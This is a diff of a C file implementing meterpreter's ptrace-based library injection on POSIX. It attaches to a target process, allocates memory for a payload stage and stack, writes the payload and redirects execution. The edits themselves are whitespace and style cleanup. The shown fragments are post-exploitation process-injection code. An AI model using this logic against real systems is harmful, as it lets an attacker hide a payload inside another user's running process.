@@ -1,8 +1,8 @@
 /*!
  * @file posix/base_inject.c
  * @brief Definition for functions which provide meterpreter library injection.
- * @details These functions are used in order to migrate meterpreter, using 
- *          ptrace to debug the new process host, allocate memory for the 
+ * @details These functions are used in order to migrate meterpreter, using
+ *          ptrace to debug the new process host, allocate memory for the
  *          meterpreter stage and a new stack, and give control. If something
  *          fails while migration, it should be able to restore the new host
  *          process and continue execution. Once migration is completed, the
@@ -85,7 +85,7 @@ UCHAR call_stub[] =
  * @retval 0 Indicates success.
  */
 LONG
-save_state(LONG pid, state *s) {	
+save_state(LONG pid, state *s) {
 	LONG result = 0;
 	LONG i = 0;
 
@@ -214,7 +214,8 @@ execute_stub(LONG pid, unsigned long addr, unsigned long *stub, ULONG stub_size)
  * @retval 0 indicates success.
  */
 LONG
-allocate(LONG pid, struct user_regs_struct *regs, unsigned long addr, size_t length) {
+allocate(LONG pid, struct user_regs_struct *regs, unsigned long addr, size_t length)
+{
 	unsigned long *alloc_code = (unsigned long *)mmap_stub;
 	unsigned long *addr_ptr = (unsigned long *)(mmap_stub + MMAP_ADDR_POS);
 	size_t *length_ptr = (size_t *)(mmap_stub + MMAP_LENGTH_POS);
@@ -229,12 +230,12 @@ allocate(LONG pid, struct user_regs_struct *regs, unsigned long addr, size_t len
 	addr_ptr[0] = addr;
 	length_ptr[0] = length;
 
-	result =	execute_stub(pid, regs->eip, alloc_code, code_size);
+	result = execute_stub(pid, regs->eip, alloc_code, code_size);
 	if (result != 0)
 		return result;
 
 	if (wait_trap(pid) == FALSE)
-		return ECANCELED; // We don't know what failed in the remote process 		
+		return ECANCELED; // We don't know what failed in the remote process
 
 	result = getregs(pid, regs);
 	if (result != 0)
@@ -262,7 +263,7 @@ call(LONG pid, struct user_regs_struct *regs, unsigned long addr) {
 	if (regs == NULL) {
 		return ERROR_INVALID_PARAMETER;
 	}
-	
+
 	// Fix call stub with entry point
 	addr_ptr[0] = addr;
 	if (debugging_enabled == 1) {
@@ -276,7 +277,7 @@ call(LONG pid, struct user_regs_struct *regs, unsigned long addr) {
 		return result;
 
 	if (wait_trap(pid) == FALSE)
-		return ECANCELED; // We don't know what failed in the remote process 		
+		return ECANCELED; // We don't know what failed in the remote process
 
 	return 0;
 }
@@ -315,7 +316,7 @@ inject_library(LONG pid, library *l) {
 	memcpy(&regs, &(s.regs), sizeof(struct user_regs_struct));
 
 	dprintf("[INJECT] Creating new code memory");
-	result = allocate(pid, &regs, NULL, CODE_SIZE);
+	result = allocate(pid, &regs, 0, CODE_SIZE);
 	dprintf("[DEBUG] result: %d", result);
 	if (result != 0)
 		goto restore;
@@ -332,7 +333,7 @@ inject_library(LONG pid, library *l) {
 	restore_state(pid, &s, 1);
 
 	dprintf("[INJECT] Creating new stack");
-  	result = allocate(pid, &regs, NULL, STACK_SIZE);
+  	result = allocate(pid, &regs, 0, STACK_SIZE);
 	if (result != 0)
 		goto restore;
 
@@ -358,7 +359,7 @@ inject_library(LONG pid, library *l) {
 	dprintf("[INJECT] Copying payload to 0x%x", regs.eax);
 	result = write_memory(pid, regs.eax, buf_ptr, library_size);
 	if (result != 0)
-		goto restore;	
+		goto restore;
 
 	dprintf("[INJECT] Fixing registers");
 	regs.esp = stack_mem;
@@ -374,11 +375,11 @@ inject_library(LONG pid, library *l) {
 
 	dprintf("[INJECT] The payload has warned successfully, migration has been successfully");
 	result = detach(pid);
-	goto end;	
+	goto end;
 
 restore:
 	restore_state(pid, &s, 0);
-end:	
+end:
 	return result;
 }
 
